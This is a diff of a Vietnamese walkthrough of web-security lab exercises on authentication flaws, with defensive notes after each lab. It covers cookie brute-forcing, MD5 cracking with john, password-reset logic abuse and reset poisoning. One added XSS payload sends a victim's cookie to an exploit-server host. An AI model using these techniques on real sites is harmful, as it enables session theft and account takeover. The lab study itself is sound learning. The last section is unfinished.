@@ -166,110 +166,10 @@ ___
 
 - Có vẻ là đã thành công, mặc dù ta cũng chả biết chính xác password là gì. Ngoài ra đây là script convert từ wordlist ban đầu sang mảng json
 ```
-s = """
-123456
-password
-12345678
-qwerty
-123456789
-12345
-1234
-111111
-1234567
-dragon
-123123
-baseball
-abc123
-football
-monkey
-letmein
-shadow
-master
-666666
-qwertyuiop
-123321
-mustang
-1234567890
-michael
-654321
-superman
-1qaz2wsx
-7777777
-121212
-000000
-qazwsx
-123qwe
-killer
-trustno1
-jordan
-jennifer
-zxcvbnm
-asdfgh
-hunter
-buster
-soccer
-harley
-batman
-andrew
-tigger
-sunshine
-iloveyou
-2000
-charlie
-robert
-thomas
-hockey
-ranger
-daniel
-starwars
-klaster
-112233
-george
-computer
-michelle
-jessica
-pepper
-1111
-zxcvbn
-555555
-11111111
-131313
-freedom
-777777
-pass
-maggie
-159753
-aaaaaa
-ginger
-princess
-joshua
-cheese
-amanda
-summer
-love
-ashley
-nicole
-chelsea
-biteme
-matthew
-access
-yankees
-987654321
-dallas
-austin
-thunder
-taylor
-matrix
-mobilemail
-mom
-monitor
-monitoring
-montana
-moon
-moscow
-"""
 import json
-result = json.dumps(s.split())
+file_path = 'wordlist.txt'
+with open(file_path, 'r', encoding='utf-8') as f:
+    result = json.dumps(f.read().split())
 print(result)
 ```
 **Notes**
@@ -459,18 +359,126 @@ ___
 ### Lab: Brute-forcing a stay-logged-in cookie
 **Yêu cầu**: Lab cho phép người dùng duy trì trạng thái đăng nhập ngay cả khi đóng trình duyệt. Cookie được sử dụng cho chức năng này có thể bị brute-force. Nhiệm vụ: brute-force cookie của `carlos` để truy cập trang **My account** của hắn và hoàn thành lab. Đăng nhập với thông tin `wiener:peter` để kiểm tra cơ chế xác thực.
 
+**Thực hiện**
+- Đăng nhập bằng tài khoản được cho để tìm hiểu về hành vi của server. Ở `POST /login` khi gửi đi kèm `stay-login:on` thì gói tin phản hồi có set một cái cookie đáng ngờ.
+![alt text](image-38.png)
+
+- Nghiên cứu về cookie này `stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`. Theo suy đoán đây có thể là Base64 encode. Decode cookie này ta được `wiener:51dc30ddc473d43a6011e9ebba6ca770`
+- Theo đề bài gợi ý thì rất có thể chuỗi vô nghĩa đằng sau là mã hash của một chuỗi cố định nào đó. Sử dụng `hashid` tool để xác định thử. Theo suy đoán đây rất có thể là mã MD5.
+![alt text](image-39.png)
+
+- Thử mã hóa password bằng MD5 ta được: `51dc30ddc473d43a6011e9ebba6ca770`. Vậy thì ta đoán được cơ chế tạo ra cookie `stay-logged`: `Base64(user||md5(password))`
+![alt text](image-40.png)
+
+- Sau khi biết được cơ chế giờ ta sẽ tạo cookie `stay-logged` đối với user `carlos`. Sử dụng Intruder để brute-force. Việc setup như trong ảnh
+![alt text](image-41.png)
+
+- Thực hiện brute-force và được kết quả.
+![alt text](image-42.png)
+
+**Notes**
+Một số trang web sử dụng cookie để duy trì đăng nhập ngay cả khi người dùng đóng trình duyệt. Nếu cookie này được tạo từ các giá trị dễ đoán như username, timestamp hoặc password, kẻ tấn công có thể brute-force để chiếm quyền truy cập.  
+
+Dù có mã hóa, nếu chỉ dùng phương pháp đơn giản như Base64 hoặc hashing không có salt, cookie vẫn có thể bị phá vỡ. Ngoài ra, nếu hệ thống không giới hạn số lần thử với cookie, brute-force có thể bỏ qua cơ chế bảo vệ đăng nhập thông thường, làm tăng nguy cơ bị tấn công.
+
+___
+
 ### Lab: Offline password cracking
 **Yêu cầu**: Lab lưu trữ **hash mật khẩu** của người dùng trong cookie. Ngoài ra, còn tồn tại lỗ hổng **XSS** trong chức năng bình luận. Nhiệm vụ: khai thác **XSS** để lấy cookie **stay-logged-in** của `carlos`, sau đó crack hash để tìm mật khẩu. Đăng nhập vào tài khoản của `carlos` và xóa tài khoản của hắn trong trang **My account** để hoàn thành lab. Đăng nhập với thông tin `wiener:peter` để kiểm tra cơ chế xác thực.
+
+**Thực hiện**
+- Theo mô tả bài lab ta sẽ phải tìm lỗ hổng `XSS`. Sau đó tiêm `XSS` và thực thi JavaScript để lấy được cookie của `carlos`. Giải mã tìm ra mật khẩu của `carlos`.
+- Đăng nhập với tài khoản được cấp. Và tìm kiếm lỗ hổng `XSS`. Thông thường `XSS` sẽ tồn tại ở các form bình luận.
+![alt text](image-43.png)
+![alt text](image-44.png)
+
+- Có thể xác nhận lỗ hổng XSS ở phần comment. Tiếp theo ta viết payload để tiêm và khi nạn nhận ấn vào ta sẽ có được cookie của nạn nhân.
+```
+<script>document.location='https://exploit-0aa6005003acba6f81ea6b33010400eb.exploit-server.net/'+document.cookie</script>
+```
+![alt text](image-45.png)
+
+- Kiểm tra xem có nạn nhân nào dính chưa. Như này là đã thành công, ta lấy được `stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`. Decode Base64 ta được chuỗi `carlos:26323c16d5f4dabff3bb136f2460a943`.
+![alt text](image-46.png)
+
+- Bước tiếp theo là crack mã hash `26323c16d5f4dabff3bb136f2460a943`. Theo bài lab trước ta biết đây có thể mã MD5 vì thế ta sử dụng các công cụ trên mạng để dò ngược. Ở đây tôi dùng `john` của kali luôn.
+> command
+echo "26323c16d5f4dabff3bb136f2460a943" > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
+
+![alt text](image-47.png)
+
+- password: `onceuponatime`. Đăng nhập lại, xóa account để hoàn thành lab.
+
+**Notes**
+Kẻ tấn công có thể khai thác lỗ hổng mà không cần tạo tài khoản bằng cách dùng XSS để đánh cắp cookie "remember me" và phân tích cấu trúc của nó. Nếu trang web sử dụng framework mã nguồn mở, thông tin về cookie có thể bị lộ, giúp việc tấn công dễ dàng hơn.  
+
+Ngoài ra, nếu mật khẩu được băm nhưng không có salt, kẻ tấn công có thể tra cứu hash trong danh sách mật khẩu phổ biến để khôi phục mật khẩu gốc. Điều này nhấn mạnh tầm quan trọng của việc sử dụng salt trong mã hóa.
+
+___
 
 ### Lab: Password reset broken logic
 **Yêu cầu**: Lab có lỗ hổng trong chức năng **đặt lại mật khẩu**. Nhiệm vụ: khai thác lỗ hổng để **đặt lại mật khẩu của `carlos`**, sau đó đăng nhập vào tài khoản của hắn và truy cập trang **My account** để hoàn thành lab. Đăng nhập với thông tin `wiener:peter` để kiểm tra cơ chế xác thực.
 
+**Thực hiện**
+- Thử các tính năng, đặc biệt là tính năng đặt lại mật khẩu. Quan sát các gói tin trên Burp.
+![alt text](image-48.png)
+
+- Ở trên param và data của gói tin POST đều có `temp-forgot-password-token=gdo38gkt6ydh42u9i4waug3j911055dm` điều này có lẽ là để phía Back End xác nhận đúng là đường link được gửi qua email. Tuy nhiên do xử lí sai cơ chế, tức là phía server chỉ kiểm tra token này có đúng là của nó sinh ra không và trong data của post có gửi đúng token đó không để xử lí. Điều này khiến ta có thể thay đổi username một cách tùy ý.
+- Thay đổi thành `carlos` và đổi password thành `1`. Truy cập bằng tài khoản `carlos` và hoàn thành lab.
+![alt text](image-49.png)
+
+**Notes**
+Việc cung cấp tính năng đặt lại mật khẩu là cần thiết nhưng cũng tiềm ẩn nhiều rủi ro bảo mật nếu không được triển khai đúng cách. Một số phương pháp phổ biến có mức độ an toàn khác nhau:  
+
+- Gửi mật khẩu qua email là cách tiếp cận không an toàn, đặc biệt nếu mật khẩu không thay đổi ngay lập tức hoặc email bị truy cập trái phép.  
+- Dùng URL đặt lại mật khẩu là một phương pháp tốt hơn, nhưng nếu URL chứa tham số đoán được (ví dụ: `?user=victim-user`), kẻ tấn công có thể lợi dụng để chiếm quyền truy cập vào tài khoản của người khác.  
+- Cách an toàn nhất là sử dụng token ngẫu nhiên có độ phức tạp cao liên kết với tài khoản người dùng và có thời gian hết hạn ngắn. Token này phải được xác minh cả khi truy cập trang đặt lại lẫn khi gửi biểu mẫu thay đổi mật khẩu.  
+- Một số hệ thống còn mắc lỗi bỏ qua xác minh token khi gửi biểu mẫu cho phép kẻ tấn công lợi dụng trang đặt lại mật khẩu từ tài khoản của họ để thay đổi mật khẩu của người khác.  
+- Nếu URL đặt lại mật khẩu được tạo động mà không có biện pháp bảo vệ, nó có thể bị password reset poisoning cho phép kẻ tấn công đánh cắp token của người khác để chiếm tài khoản.  
+
+Những sai sót này cho thấy tính năng đặt lại mật khẩu cần được thiết kế cẩn thận để tránh bị khai thác, đặc biệt là các vấn đề liên quan đến xác thực token và bảo mật email.
+
+___
 
 ### Lab: Password reset poisoning via middleware
 **Yêu cầu**: Lab có lỗ hổng **password reset poisoning**, trong đó người dùng `carlos` sẽ nhấp vào bất kỳ liên kết nào trong email mà hắn nhận được. Nhiệm vụ: khai thác lỗ hổng này để chiếm quyền truy cập tài khoản của `carlos`. Bạn có thể đăng nhập vào tài khoản của mình với thông tin `wiener:peter`, và mọi email gửi đến tài khoản này có thể được đọc qua email client trên exploit server.
 
+**Thực hiện**
+- Sau khi tìm hiểu về cơ chế hoạt động của web. Web sử dụng cơ chế `generated dynamically` để sinh ra `url password reset`. 
+- Cụ thể ở bài lab này cơ chế `generated dynamically` sử dụng `Host` và ghép với một phần `api` để truy vấn tới trang reset password
+![alt text](image-50.png)
+![alt text](image-51.png)
+
+- Thay đổi trường `Host` thì gây ra lỗi
+![alt text](image-52.png)
+
+- Tuy nhiên sử dụng header `X-Forwardded-Host` để bypass thì thành công.
+![alt text](image-53.png)
+![alt text](image-54.png)
+
+- Thế thì ta có thể thao túng đường dẫn này tới con server của kẻ tấn công. Khi nạn nhân ấn vào link thì phía bên kẻ tấn công sẽ thấy được và biết được phần reset-token được thêm vào.
+- Thay đổi gói tin và thực hiện tấn công
+![alt text](image-55.png)
+![alt text](image-56.png)
+
+- `/forgot-password?temp-forgot-password-token=rtl6g1vwgc5bzgc95iyb7ny454nbg33e`. Giờ thì chỉ cần paste vào trang ban đầu và đổi password. Sau đó đăng nhập với `carlos` là xong.
+![alt text](image-57.png)
+![alt text](image-58.png)
+
+**Notes**
+ Bài lab khai thác lỗ hổng khi hệ thống sử dụng giá trị `X-Forwarded-Host` hoặc `Host` không được xác thực để tạo URL đặt lại mật khẩu. Kẻ tấn công có thể thay đổi giá trị này để gửi nạn nhân đến một domain do họ kiểm soát, từ đó đánh cắp token đặt lại mật khẩu.  
+
+Ngoài ra, nếu hệ thống không vô hiệu hóa hoặc xác thực lại token khi đặt lại mật khẩu, kẻ tấn công có thể tái sử dụng nó để chiếm quyền tài khoản. Lỗ hổng này thường xảy ra trong các hệ thống có `proxy` hoặc `load balancer`, nơi middleware xử lý sai giá trị `Host`.
+
+___
+
 ### Lab: Password brute-force via password change
 **Yêu cầu**: Lab có lỗ hổng trong chức năng đổi mật khẩu, cho phép brute-force. Nhiệm vụ: sử dụng danh sách mật khẩu có sẵn để brute-force tài khoản của `carlos`, sau đó đăng nhập và truy cập trang My account của hắn để hoàn thành lab. Bạn có thể đăng nhập vào tài khoản của mình với thông tin `wiener:peter`.
 
+**Thực hiện**
+- Thử chức năng đổi password với tài khoản `wiener`
+
+**Notes**
 
 
